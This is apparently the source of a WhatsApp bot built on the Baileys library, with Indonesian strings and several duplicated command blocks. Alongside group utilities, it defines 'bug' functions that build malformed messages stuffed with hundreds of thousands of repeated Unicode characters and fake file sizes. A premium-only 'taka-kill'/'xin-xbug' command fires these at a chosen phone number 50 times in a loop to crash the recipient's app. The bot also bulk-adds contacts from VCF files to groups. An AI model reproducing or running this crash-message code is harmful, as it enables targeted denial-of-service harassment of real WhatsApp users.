global.lastVcfAdd = {}
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (AndraZyy, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (AndraZyy.user.id.split(':')[0]+'@s.whatsapp.net' || AndraZyy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await AndraZyy.decodeJid(AndraZyy.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await AndraZyy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
try {
ppuser = await AndraZyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
AndraZyy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
AndraZyy.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//FUNCTION ABAL ABAL 🗿
async function Bug2(target, ptcp = false) {
    let akumw = "kingtaka Developer" + "ꦿꦾ꧀".repeat(50000);
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function DocBug(target) {
 let virtex = "⚡ᛕ꠸ꪀᧁꪻꪖᛕꪖ ᥫ᭡ ℭ𝔥𝔯𝔦𝔰_𝔇𝔦𝔬𝔯 𝐈𝐦𝐮𝐭⚡";
   AndraZyy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⚡ᛕ꠸ꪀᧁꪻꪖᛕꪖ ᥫ᭡ ℭ𝔥𝔯𝔦𝔰_𝔇𝔦𝔬𝔯 𝐈𝐦𝐮𝐭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ᛕ꠸ꪀᧁꪻꪖᛕꪖ" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `⚡ᛕ꠸ꪀᧁꪻꪖᛕꪖ ᥫ᭡ ℭ𝔥𝔯𝔦𝔰_𝔇𝔦𝔬𝔯 𝐈𝐦𝐮𝐭⚡`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "⚡ᛕ꠸ꪀᧁꪻꪖᛕꪖ ᥫ᭡ ℭ𝔥𝔯𝔦𝔰_𝔇𝔦𝔬𝔯 𝐈𝐦𝐮𝐭⚡" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await AndraZyy.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["237690768603@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `ᛕ꠸ꪀᧁꪻꪖᛕꪖ ꪻꪖᛕꪖ ᥇ꪊᧁ 5`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ᛕ꠸ꪀᧁꪻꪖᛕꪖ" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " ᛕ꠸ꪀᧁꪻꪖᛕꪖ " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
AndraZyy.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:deltaonexi@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/yoshi-xhurayra\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
AndraZyy.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}




const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

async function downloadMp3 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}


global.public = false
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}


const reply = (teks) => { 
AndraZyy.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "ᛕ꠸ꪀᧁꪻꪖᛕꪖ", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "error", 
"sourceUrl": "https://whatsapp.com/channel/0029Vark1I1AYlUR1G8YMX31" }}}, { quoted: m }) }

const reply2 = (teks) => {
AndraZyy.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh'
}
if(timee < "03:00:00"){
var waktuucapan = 'Selamat Tengah Malam'
}

switch(command) {
case 'kickvcf': {
  if (!m.isGroup) return reply("Use this in a group.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  if (!quoted || !quoted.mimetype || !quoted.mimetype.includes('text/x-vcard')) {
    return reply("Reply to a VCF file.");
  }
  const fileBuffer = await quoted.download();
  const vcfText = fileBuffer.toString();
  const phoneNumbers = [...vcfText.matchAll(/TEL.*?:+?(d{7,15})/g)].map(m => m[1]);
  const vcfJids = phoneNumbers.map(num => num.replace(/D/g, '') + '@s.whatsapp.net');
  const groupMeta = await AndraZyy.groupMetadata(m.chat);
  const groupJids = groupMeta.participants.map(p => p.id);
  const targets = groupJids.filter(jid => vcfJids.includes(jid));
  if (!targets.length) return reply("No matching group members found in the VCF.");
  reply(`Kicking ${targets.length} users found in VCF...`);
  for (const jid of targets) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to kick ${jid}`, e.message);
    }
  }
  reply("Finished kicking matching contacts.");
}
break;

case 'tagall': {
  if (!m.isGroup) return reply("Use this in a group.");
  const mentions = participants.map(p => p.id);
  const textAll = mentions.map(jid => '@' + jid.split('@')[0]).join(' ') + (text ? ' ' + text : '');
  await AndraZyy.sendMessage(m.chat, { text: textAll, mentions }, { quoted: m });
}
break;

case 'all': {
  if (!m.isGroup) return reply("Use this in a group.");
  const mentions = participants.map(p => p.id);
  const customText = text || '';
  await AndraZyy.sendMessage(m.chat, { text: customText, mentions }, { quoted: m });
}
break;

case 'addvcf-all': {
  if (!m.isGroup) return reply("Use this in a group only.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  if (!quoted || !quoted.mimetype || !quoted.mimetype.includes('text/x-vcard')) {
    return reply("Reply to a VCF file.");
  }

  const fileBuffer = await quoted.download();
  const vcfText = fileBuffer.toString();
  const phoneNumbers = [...vcfText.matchAll(/TEL.*?:+?(d{7,15})/g)].map(m => m[1]);

  const jids = phoneNumbers.map(num => num.replace(/D/g, '') + '@s.whatsapp.net');
  global.lastVcfAdd[m.chat] = jids;
  reply(`Trying to add ${jids.length} contacts...`);

  for (const jid of jids) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'add');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to add ${jid}`, e.message);
    }
  }

  reply("Finished adding contacts from VCF.");
}
break;

case 'addvcf-except': {
  if (!m.isGroup) return reply("Use this in a group only.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  if (!quoted || !quoted.mimetype || !quoted.mimetype.includes('text/x-vcard')) {
    return reply("Reply to a VCF file.");
  }

  const exclude = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const fileBuffer = await quoted.download();
  const vcfText = fileBuffer.toString();
  const phoneNumbers = [...vcfText.matchAll(/TEL.*?:+?(d{7,15})/g)].map(m => m[1]);

  const jids = phoneNumbers
    .map(num => num.replace(/D/g, '') + '@s.whatsapp.net')
    .filter(jid => jid !== exclude);

  global.lastVcfAdd[m.chat] = jids;
  reply(`Trying to add ${jids.length} contacts...`);

  for (const jid of jids) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'add');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to add ${jid}`, e.message);
    }
  }

  reply("Done processing VCF with exclusions.");
}
break;

case 'kickvcf': {
  if (!m.isGroup) return reply("Use this in a group.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  const kicked = global.lastVcfAdd[m.chat] || [];
  if (!kicked.length) return reply("No VCF users recorded for this group.");
  reply(`Kicking ${kicked.length} users...`);
  for (const jid of kicked) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to kick ${jid}`, e.message);
    }
  }
  global.lastVcfAdd[m.chat] = [];
  reply("Done.");
}
break;

case 'kickvcf-except': {
  if (!m.isGroup) return reply("Use this in a group.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  const kicked = global.lastVcfAdd[m.chat] || [];
  const exclude = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const filtered = kicked.filter(jid => jid !== exclude);
  if (!filtered.length) return reply("No eligible VCF users to kick.");
  reply(`Kicking ${filtered.length} users except ${exclude}...`);

  for (const jid of filtered) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to kick ${jid}`, e.message);
    }
  }

  reply("Done.");
}
break;

case 'vcf': {
  if (!m.isGroup) return reply("Use this in a group.");
  const groupMeta = await AndraZyy.groupMetadata(m.chat);
  const vcardList = groupMeta.participants.map(p => {
    const number = p.id.split('@')[0];
    return `BEGIN:VCARDnVERSION:3.0nFN:${number}nTEL;type=CELL:+${number}nEND:VCARD`;
  }).join('n');
  const filename = `group-${Date.now()}.vcf`;
  const filepath = `/tmp/${filename}`;
  require('fs').writeFileSync(filepath, vcardList);
  await AndraZyy.sendMessage(m.chat, {
    document: { url: filepath },
    fileName: filename,
    mimetype: 'text/x-vcard'
  }, { quoted: m });
}
break;

case 'tagall': {
  if (!m.isGroup) return reply("Use this in a group.");
  const mentions = participants.map(p => p.id);
  const textAll = mentions.map(jid => '@' + jid.split('@')[0]).join(' ') + (text ? ' ' + text : '');
  await AndraZyy.sendMessage(m.chat, { text: textAll, mentions }, { quoted: m });
}
break;

case 'all': {
  if (!m.isGroup) return reply("Use this in a group.");
  const mentions = participants.map(p => p.id);
  const customText = text || '';
  await AndraZyy.sendMessage(m.chat, { text: customText, mentions }, { quoted: m });
}
break;

case 'kickvcf': {
  if (!m.isGroup) return reply("Use this in a group.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  const kicked = global.lastVcfAdd[m.chat] || [];
  if (!kicked.length) return reply("No VCF users recorded for this group.");
  reply(`Kicking ${kicked.length} users...`);
  for (const jid of kicked) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to kick ${jid}`, e.message);
    }
  }
  global.lastVcfAdd[m.chat] = [];
  reply("Done.");
}
break;

case 'vcf': {
  if (!m.isGroup) return reply("Use this in a group.");
  const groupMeta = await AndraZyy.groupMetadata(m.chat);
  const vcardList = groupMeta.participants.map(p => {
    const number = p.id.split('@')[0];
    return `BEGIN:VCARDnVERSION:3.0nFN:${number}nTEL;type=CELL:+${number}nEND:VCARD`;
  }).join('n');
  const filename = `group-${Date.now()}.vcf`;
  const filepath = `/tmp/${filename}`;
  require('fs').writeFileSync(filepath, vcardList);
  await AndraZyy.sendMessage(m.chat, {
    document: { url: filepath },
    fileName: filename,
    mimetype: 'text/x-vcard'
  }, { quoted: m });
}
break;

case 'groupmenu': {
  if (!m.isGroup) return reply("Use this in a group.");
  const groupText = `*👥 Group Menu Commands:*

` +
                    `• ${prefix}tagall — Tag everyone visibly
` +
                    `• ${prefix}all <msg> — Tag everyone silently
` +
                    `• ${prefix}addvcf-all — Add all contacts from a VCF file
` +
                    `• ${prefix}addvcf-except <jid> — Add all from VCF excluding one
` +
                    `• ${prefix}kickvcf — Kick all users added via last VCF
` +
                    `• ${prefix}kickvcf-except <jid> — Kick all VCF users except one
` +
                    `• ${prefix}vcf — Export current group to a VCF`;

  await AndraZyy.sendMessage(m.chat, { text: groupText }, { quoted: m });
}
break;

case 'addvcf-except': {
  if (!m.isGroup) return reply("Use this in a group only.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  if (!quoted || !quoted.mimetype || !quoted.mimetype.includes('text/x-vcard')) {
    return reply("Reply to a VCF file.");
  }

  const exclude = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const fileBuffer = await quoted.download();
  const vcfText = fileBuffer.toString();
  const phoneNumbers = [...vcfText.matchAll(/TEL.*?:+?(d{7,15})/g)].map(m => m[1]);

  const jids = phoneNumbers
    .map(num => num.replace(/D/g, '') + '@s.whatsapp.net')
    .filter(jid => jid !== exclude);

  global.lastVcfAdd[m.chat] = jids;
  reply(`Trying to add ${jids.length} contacts...`);

  for (const jid of jids) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'add');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to add ${jid}`, e.message);
    }
  }

  reply("Done processing VCF with exclusions.");
}
break;

case 'addvcf-all': {
  if (!m.isGroup) return reply("Use this in a group only.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  if (!quoted || !quoted.mimetype || !quoted.mimetype.includes('text/x-vcard')) {
    return reply("Reply to a VCF file.");
  }

  const fileBuffer = await quoted.download();
  const vcfText = fileBuffer.toString();
  const phoneNumbers = [...vcfText.matchAll(/TEL.*?:+?(d{7,15})/g)].map(m => m[1]);

  const jids = phoneNumbers.map(num => num.replace(/D/g, '') + '@s.whatsapp.net');
  global.lastVcfAdd[m.chat] = jids;
  reply(`Trying to add ${jids.length} contacts...`);

  for (const jid of jids) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'add');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to add ${jid}`, e.message);
    }
  }

  reply("Finished adding contacts from VCF.");
}
break;

case 'kickvcf-except': {
  if (!m.isGroup) return reply("Use this in a group.");
  if (!isAdmins || !isBotAdmins) return reply("Bot and you must be admin.");
  const kicked = global.lastVcfAdd[m.chat] || [];
  const exclude = args[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  const filtered = kicked.filter(jid => jid !== exclude);
  if (!filtered.length) return reply("No eligible VCF users to kick.");
  reply(`Kicking ${filtered.length} users except ${exclude}...`);

  for (const jid of filtered) {
    try {
      await AndraZyy.groupParticipantsUpdate(m.chat, [jid], 'remove');
      await sleep(1500);
    } catch (e) {
      console.log(`Failed to kick ${jid}`, e.message);
    }
  }

  reply("Done.");
}
break;









case "taka-kill": case "taka-v1": case "taka-v2": case "taka-v3": case "xin-xbug": case "ui-system":
if (!isPremium) return reply(" Not a premium member ")
if (!q) {
return reply(`Example: ${prefix + command} 237xxx`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug by ${prefix+command} successfully Done. *Pause 5 minutes*`);
for (let i = 0; i < 50; i++) {
await func1(target);
await ngeloc(target);
await killui(target);
await ngeloc(target);
await Bug2(target);
await DocBug(target);
await LocaBugs(target);
}
break;

case "menu": case "taka": case "takadev": case "chrisdev": case "chris": case "kingtaka": case "allmenu": case "bugmenu": {
  if (!isPremium) return reply(" khusus premium ");
  const menuMessage = `┏❐⌜ *⚜️⃟𒆜ꪻꪖᛕꪖ ᥇ꪊᧁ 5×⃟⚜️* ⌟
┃⚜️ 𝐧𝐚𝐦𝐞 : ꪻꪖᛕꪖ ↯ ᥇ꪊᧁ 5
┃⚜️ 𝐮𝐬𝐞𝐫 : *${pushname}*
┃⚜️ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : *( 5.1.𝟎 )*⚡
┃⚜️ 𝐫𝐮𝐧 : *${runtime(process.uptime())}*
